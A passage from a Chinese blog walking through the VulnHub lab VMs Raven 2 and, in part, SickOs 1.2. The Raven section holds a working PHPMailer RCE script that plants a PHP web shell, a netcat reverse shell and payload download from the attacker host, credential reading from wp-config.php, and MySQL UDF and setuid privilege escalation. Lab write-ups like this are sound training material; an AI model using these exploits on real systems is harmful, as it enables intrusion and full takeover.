<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PHPMailer-lt-5-2-18-远程命令执行"><a href="#PHPMailer-lt-5-2-18-远程命令执行" class="headerlink" title="PHPMailer&lt;5.2.18-远程命令执行"></a>PHPMailer&lt;5.2.18-远程命令执行</h3><p>看起来该站点还使用PHPMailer 5.2.16。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub219.jpg"></li>
</ul>
<p>5.2.18之前的PHPMailer版本易于执行远程命令</p>
<p>为此编写一个bash脚本，使用curl作为漏洞利用的主要驱动程序。</p>
<p>exploit.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">TARGET=http://raven.local/contact.php</span><br><span class="line"></span><br><span class="line">DOCROOT=/var/www/html</span><br><span class="line">FILENAME=backdoor.php</span><br><span class="line">LOCATION=<span class="variable">$DOCROOT</span>/<span class="variable">$FILENAME</span></span><br><span class="line"></span><br><span class="line">STATUS=$(curl -s \</span><br><span class="line">              --data-urlencode <span class="string">&quot;name=Hackerman&quot;</span> \</span><br><span class="line">              --data-urlencode <span class="string">&quot;email=\&quot;hackerman\\\&quot; -oQ/tmp -X<span class="variable">$LOCATION</span> blah\&quot;@badguy.com&quot;</span> \</span><br><span class="line">              --data-urlencode <span class="string">&quot;message=&lt;?php echo shell_exec(\$_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span> \</span><br><span class="line">              --data-urlencode <span class="string">&quot;action=submit&quot;</span> \</span><br><span class="line">              <span class="variable">$TARGET</span> | sed -r <span class="string">&#x27;146!d&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> grep <span class="string">&#x27;instantiate&#x27;</span> &amp;&gt;/dev/null &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$STATUS</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;[+] Check <span class="variable">$&#123;LOCATION&#125;</span>?cmd=[shell command, e.g. id]&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;[!] Exploit failed&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>执行脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/raven2<span class="comment"># ./exploit.sh </span></span><br><span class="line">[+] Check /var/www/html/backdoor.php?cmd=[shell <span class="built_in">command</span>, e.g. id]</span><br></pre></td></tr></table></figure>

<p>之后成功运行命令如下图所示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">view-source:http://raven.local/backdoor.php?cmd=whoami</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub220.jpg"></li>
</ul>
<h3 id="低权限的shell"><a href="#低权限的shell" class="headerlink" title="低权限的shell"></a>低权限的shell</h3><p>使用nc的-e选项反弹一个低权限的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">view-source:http://raven.local/backdoor.php?cmd=nc%20192.168.56.102%205566%20<span class="_">-e</span>%20/bin/bash</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">connect to [192.168.56.102] from raven.local [192.168.56.119] 44985</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@Raven:/var/www/html$ id                                              </span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@Raven:/var/www/html$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<p>现在获取了一个低权限的shell</p>
<h3 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag 2"></a>Flag 2</h3><p>第二个flag位于www-data的home目录中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ww-data@Raven:/var/www$ ls</span><br><span class="line">ls</span><br><span class="line">flag2.txt  html</span><br><span class="line">www-data@Raven:/var/www$ cat flag2.txt</span><br><span class="line">cat flag2.txt</span><br><span class="line">flag2&#123;6a8ed560f0b5358ecf844108048eb337&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag 3"></a>Flag 3</h3><p>使用find命令寻找flag3</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Raven:/var/www$ find / -<span class="built_in">type</span> f -name <span class="string">&#x27;flag[3-4].*&#x27;</span> 2&gt;/dev/null</span><br><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">&#x27;flag[3-4].*&#x27;</span> 2&gt;/dev/null</span><br><span class="line">/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png</span><br></pre></td></tr></table></figure>

<p>浏览器访问</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://raven.local/wordpress/wp-content/uploads/2018/11/flag3.png</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub221.jpg"></li>
</ul>
<p>到此得到第3个flag</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在对www-data的帐户进行枚举时，注意到MySQL以root身份运行。但是由于此版本的MySQL是5.5，所以不能使用流行的EDB-ID 1518用户定义函数或UDF。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root       921  0.0 10.1 552000 51240 ?        Sl   01:02   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --<span class="built_in">log</span>-error=/var/<span class="built_in">log</span>/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Raven:/var/www$ dpkg -l | grep mysql</span><br><span class="line">dpkg -l | grep mysql</span><br><span class="line">ii  libdbd-mysql-perl              4.028-2+deb8u2                     amd64        Perl5 database interface to the MySQL database</span><br><span class="line">ii  libmysqlclient18:amd64         5.5.60-0+deb8u1                    amd64        MySQL database client library</span><br><span class="line">ii  mysql-client-5.5               5.5.60-0+deb8u1                    amd64        MySQL database client binaries</span><br><span class="line">ii  mysql-common                   5.5.60-0+deb8u1                    all          MySQL database common files, e.g. /etc/mysql/my.cnf</span><br><span class="line">ii  mysql-server                   5.5.60-0+deb8u1                    all          MySQL database server (metapackage depending on the latest version)</span><br><span class="line">ii  mysql-server-5.5               5.5.60-0+deb8u1                    amd64        MySQL database server binaries and system database setup</span><br><span class="line">ii  mysql-server-core-5.5          5.5.60-0+deb8u1                    amd64        MySQL database server binaries</span><br><span class="line">ii  php5-mysqlnd                   5.6.36+dfsg-0+deb8u1               amd64        MySQL module <span class="keyword">for</span> php5 (Native Driver)</span><br><span class="line">ii  php5-mysqlnd-ms                1.6.0-1+b1                         amd64        MySQL replication and load balancing module <span class="keyword">for</span> PHP</span><br></pre></td></tr></table></figure>

<p>从wp-config.php文件中得到mysql的账号密码登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Raven:/var/www/html$ grep -A3 -B3 root wordpress/wp-config.php</span><br><span class="line">grep -A3 -B3 root wordpress/wp-config.php</span><br><span class="line">define(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;R@v3nSecurity&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>【提权方法1】：</li>
</ul>
<p>有一个GitHub仓库<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL215c3FsdWRm">UDF-Repository-for-MySQL<i class="fa fa-external-link-alt"></i></span>，其中托管着许多5.5兼容的UDF，可以使用它们来完成提权。选择<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL215c3FsdWRmL2xpYl9teXNxbHVkZl9zeXM=">lib_mysqludf_sys<i class="fa fa-external-link-alt"></i></span>，这是一个具有与操作系统交互功能的UDF库。</p>
<ul>
<li>【提权方法2】：</li>
</ul>
<p>MySQL利用远程root代码执行提权</p>
<p>更多信息参考<span class="exturl" data-url="aHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tL2Fkdmlzb3JpZXMvTXlTUUwtRXhwbG9pdC1SZW1vdGUtUm9vdC1Db2RlLUV4ZWN1dGlvbi1Qcml2ZXNjLUNWRS0yMDE2LTY2NjIuaHRtbA==">MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662<i class="fa fa-external-link-alt"></i></span></p>
<p>因此，搜索UDF动态库漏洞利用程序，并在漏洞利用数据库中将其命名为“1518.c”。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTUxOA==">exploit-1518<i class="fa fa-external-link-alt"></i></span></p>
<p>该漏洞利用是通过将原始C代码编译为“.so”文件，然后将其传输到受害计算机并利用MySQL漏洞来运行的。<br>第一步是对其进行编译。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/raven2/priviligesc<span class="comment"># searchsploit 1518</span></span><br><span class="line">MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)           | exploits/linux/<span class="built_in">local</span>/1518.c</span><br><span class="line">root@kali:~/vulnhub/raven2/priviligesc<span class="comment"># locate 1518.c</span></span><br><span class="line">/root/vulnhub/raven1/1518.c</span><br><span class="line">/usr/share/exploitdb/exploits/linux/<span class="built_in">local</span>/1518.c</span><br><span class="line">root@kali:~/vulnhub/raven2/priviligesc<span class="comment"># cp /usr/share/exploitdb/exploits/linux/local/1518.c .</span></span><br><span class="line">root@kali:~/vulnhub/raven2/priviligesc<span class="comment"># ls</span></span><br><span class="line">1518.c</span><br><span class="line">root@kali:~/vulnhub/raven2/priviligesc<span class="comment"># gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc</span></span><br><span class="line">root@kali:~/vulnhub/raven2/priviligesc<span class="comment"># ls</span></span><br><span class="line">1518.c  1518.so</span><br></pre></td></tr></table></figure>

<p>将该“.so”文件传输到受害者计算机的/tmp目录下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/raven2/priviligesc<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">192.168.56.1 - - [26/Mar/2020 03:52:25] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [26/Mar/2020 03:52:33] <span class="string">&quot;GET /1518.so HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.119 - - [26/Mar/2020 03:52:50] <span class="string">&quot;GET /1518.so HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Raven:/tmp$ wget http://192.168.56.102/1518.so</span><br><span class="line">wget http://192.168.56.102/1518.so</span><br><span class="line">converted <span class="string">&#x27;http://192.168.56.102/1518.so&#x27;</span> (ANSI_X3.4-1968) -&gt; <span class="string">&#x27;http://192.168.56.102/1518.so&#x27;</span> (UTF-8)</span><br><span class="line">--2020-03-27 02:52:49--  http://192.168.56.102/1518.so</span><br><span class="line">Connecting to 192.168.56.102:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 19104 (19K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;1518.so&#x27;</span></span><br><span class="line"></span><br><span class="line">1518.so             100%[=====================&gt;]  18.66K  --.-KB/s   <span class="keyword">in</span> 0s     </span><br><span class="line"></span><br><span class="line">2020-03-27 02:52:49 (554 MB/s) - <span class="string">&#x27;1518.so&#x27;</span> saved [19104/19104]</span><br><span class="line"></span><br><span class="line">www-data@Raven:/tmp$ chmod 777 *</span><br><span class="line">chmod 777 *</span><br></pre></td></tr></table></figure>

<ul>
<li>使用命令行登录mysql，利用漏洞和mysql命令行及so文件进行提权,如下所示</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Raven:/tmp$ mysql -uroot -p<span class="string">&#x27;R@v3nSecurity&#x27;</span></span><br><span class="line">mysql -uroot -p<span class="string">&#x27;R@v3nSecurity&#x27;</span></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 37</span><br><span class="line">Server version: 5.5.60-0+deb8u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">use mysql;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(<span class="string">&#x27;/tmp/1518.so&#x27;</span>));</span><br><span class="line">select * from foo into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/1518.so&#x27;</span>;</span><br><span class="line">create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;1518.so&#x27;</span>;</span><br><span class="line">select do_system(<span class="string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(<span class="string">&#x27;/tmp/1518.so&#x27;</span>));</span><br><span class="line">select * from foo into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/1518.so&#x27;</span>;</span><br><span class="line">create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;1518.so&#x27;</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into foo values(load_file(<span class="string">&#x27;/tmp/1518.so&#x27;</span>));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from foo into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/1518.so&#x27;</span>;</span><br><span class="line">Query OK, 1 row affected (0.10 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;1518.so&#x27;</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select do_system(<span class="string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);</span><br><span class="line">&lt;mod u+s /usr/bin/find<span class="string">&#x27;);select do_system(&#x27;</span>chmod u+s /usr/bin/find<span class="string">&#x27;);        </span></span><br><span class="line"><span class="string">+--------------------------------------+</span></span><br><span class="line"><span class="string">| do_system(&#x27;</span>chmod u+s /usr/bin/find<span class="string">&#x27;) |</span></span><br><span class="line"><span class="string">+--------------------------------------+</span></span><br><span class="line"><span class="string">|                                    0 |</span></span><br><span class="line"><span class="string">+--------------------------------------+</span></span><br><span class="line"><span class="string">1 row in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+--------------------------------------+</span></span><br><span class="line"><span class="string">| do_system(&#x27;</span>chmod u+s /usr/bin/find<span class="string">&#x27;) |</span></span><br><span class="line"><span class="string">+--------------------------------------+</span></span><br><span class="line"><span class="string">|                                    0 |</span></span><br><span class="line"><span class="string">+--------------------------------------+</span></span><br><span class="line"><span class="string">1 row in set (0.00 sec)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>开始提权并读取最后的flag4</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Raven:/tmp$ touch lucifer11</span><br><span class="line">www-data@Raven:/tmp$ find lucifer11 -<span class="built_in">exec</span> <span class="string">&quot;whoami&quot;</span> \;</span><br><span class="line">find lucifer11 -<span class="built_in">exec</span> <span class="string">&quot;whoami&quot;</span> \;</span><br><span class="line">root</span><br><span class="line">www-data@Raven:/tmp$ find lucifer11 -<span class="built_in">exec</span> <span class="string">&quot;id&quot;</span> \;</span><br><span class="line">find lucifer11 -<span class="built_in">exec</span> <span class="string">&quot;id&quot;</span> \;</span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</span><br><span class="line">www-data@Raven:/tmp$ find lucifer11 -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br><span class="line">find lucifer11 -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/tmp</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">flag4.txt</span><br><span class="line"><span class="comment"># cat flag4.txt</span></span><br><span class="line">cat flag4.txt</span><br><span class="line">  ___                   ___ ___ </span><br><span class="line"> | _ \__ ___ _____ _ _ |_ _|_ _|</span><br><span class="line"> |   / _` \ V / -_) <span class="string">&#x27; \ | | | | </span></span><br><span class="line"><span class="string"> |_|_\__,_|\_/\___|_||_|___|___|</span></span><br><span class="line"><span class="string">                           </span></span><br><span class="line"><span class="string">flag4&#123;df2bc5e951d91581467bb9a2a8ff4425&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">CONGRATULATIONS on successfully rooting RavenII</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you enjoyed this second interation of the Raven VM</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hit me up on Twitter and let me know what you thought: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@mccannwj / wjmccann.github.io</span></span><br></pre></td></tr></table></figure>

<p>完成提权并且成功的读取到了flag4</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub222.jpg"></li>
</ul>
<ul>
<li>【提权方法3】：</li>
</ul>
<p>还是利用Mysql udf提权，只不过这次用到setuid.c</p>
<p>setuid.c</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    setuid(0); setgid(0); system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是整个mysql语句的操作命令，步骤可以参照【提权方式2】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(<span class="string">&#x27;/tmp/raptor_udf2.so&#x27;</span>));</span><br><span class="line">select * from foo into dumpfile <span class="string">&#x27;/usr/lib/raptor_udf2.so&#x27;</span>;</span><br><span class="line">create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class="line">select * from foo into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;</span>;</span><br><span class="line">create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>; </span><br><span class="line">select * from mysql.func;</span><br><span class="line">select do_system(<span class="string">&#x27;gcc -o /tmp/setuid /tmp/setuid.c&#x27;</span>);</span><br><span class="line">select do_system(<span class="string">&#x27;chmod u+s /tmp/setuid&#x27;</span>);</span><br><span class="line">\! sh .</span><br><span class="line">/setuid</span><br></pre></td></tr></table></figure>

<p>命令执行完成之后即拥有了root权限的shell</p>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>PHPMailer&lt;5.2.18-远程命令执行</li>
<li>mysql5.5版本udf提权（1518.c）</li>
<li>setuid.c脚本提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[SickOs-1-2]</title>
    <url>/2020/03/30/SickOs-1-2/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：SickOs: 1.2<br>发布日期：2016年4月27日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zaWNrb3Mvc2ljazBzMS4yLnppcA==">https://download.vulnhub.com/sickos/sick0s1.2.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zaWNrb3Mvc2ljazBzMS4yLnppcC50b3JyZW50">https://download.vulnhub.com/sickos/sick0s1.2.zip.torrent<i class="fa fa-external-link-alt"></i></span> </li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Name........: SickOs1.2</span><br><span class="line">Date Release: 26 Apr 2016</span><br><span class="line">Author......: D4rk</span><br><span class="line">Series......: SickOs</span><br><span class="line">Objective...: Get /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span><br><span class="line">Tester(s)...: h1tch1, Eagle11</span><br><span class="line">Twitter.....: https://twitter.com/D4rk36</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">这是SickOs后续系列中的第二篇文章，与先前的发行版无关，挑战范围是在系统上获得最高特权。</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Filename: Sick0s1.2.zip</span><br><span class="line">File size: 696.2 MB</span><br><span class="line">MD5: b013ba76f50c15890554632a40b697bd</span><br><span class="line">SHA1: 9f45f7c060e15dc6bb93c1cf39efdd75125e30a0</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Format: OVF</span><br><span class="line">Operating System: Ubuntu</span><br><span class="line">Tested on: VMWare workstation Pro 12.1.0 build-3272444</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DHCP service: Enabled</span><br><span class="line">IP address: Automatically assign</span><br></pre></td></tr></table></figure>

<p>需要使用VMware。可能对VirtualBox有问题。如果要使用virtualbox打开的话，解决方案：打开.ovf文件，将“ElementName”的所有实例替换为“Caption”，并将“vmware.sata.ahci”替换为“AHCI”。还要删除.mf文件，然后按常规导入。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.66.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.66.14</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line">MAC Address: 00:0C:29:1B:36:86 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -v -p- 192.168.66.14</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    lighttpd 1.4.28</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -p 22,80 192.168.66.14 -T4 --script=vuln</span></span><br><span class="line">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    lighttpd 1.4.28</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /<span class="built_in">test</span>/: Test page</span><br><span class="line">|_http-server-header: lighttpd/1.4.28</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_      http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:lighttpd:lighttpd:1.4.28: </span><br><span class="line">|       CVE-2013-4559   7.6     https://vulners.com/cve/CVE-2013-4559</span><br><span class="line">|       CVE-2014-2323   7.5     https://vulners.com/cve/CVE-2014-2323</span><br><span class="line">|       CVE-2013-4508   5.8     https://vulners.com/cve/CVE-2013-4508</span><br><span class="line">|       CVE-2018-19052  5.0     https://vulners.com/cve/CVE-2018-19052</span><br><span class="line">|       CVE-2014-2324   5.0     https://vulners.com/cve/CVE-2014-2324</span><br><span class="line">|       CVE-2011-4362   5.0     https://vulners.com/cve/CVE-2011-4362</span><br><span class="line">|_      CVE-2013-4560   2.6     https://vulners.com/cve/CVE-2013-4560</span><br></pre></td></tr></table></figure>

<p>目录爆破一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.66.14/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon Mar 30 01:39:50 2020</span><br><span class="line">URL_BASE: http://192.168.66.14/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.66.14/ ----</span><br><span class="line">+ http://192.168.66.14/index.php (CODE:200|SIZE:163)                                                                      </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.14/<span class="built_in">test</span>/                                                                                 </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: http://192.168.66.14/<span class="built_in">test</span>/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Mon Mar 30 01:40:02 2020</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 1</span><br></pre></td></tr></table></figure>

